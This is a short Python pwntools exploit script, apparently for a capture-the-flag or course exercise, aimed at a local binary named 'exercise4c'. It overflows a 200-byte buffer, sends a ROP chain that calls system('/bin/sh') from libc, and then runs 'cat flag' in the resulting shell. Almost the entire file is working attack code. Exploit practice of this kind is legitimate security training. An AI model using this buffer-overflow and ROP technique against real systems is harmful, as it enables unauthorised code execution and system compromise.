#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = './exercise4c'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

BUFFER_OFFSET = 200

r = start()

# Prepare the rop chain
rop = ROP(r.libc)
rop.call('puts', [next(r.libc.search(b'/bin/sh\x00'))])
rop.call('system', [next(r.libc.search(b'/bin/sh\x00'))])

# Send the initial message to launch a shell
init_msg = b'A' * BUFFER_OFFSET + rop.chain()
out = r.recv()
r.sendline(init_msg)
out = r.recv()

# Retrieve the flag
r.sendline(b'cat flag')
out = r.recv()
print(out)
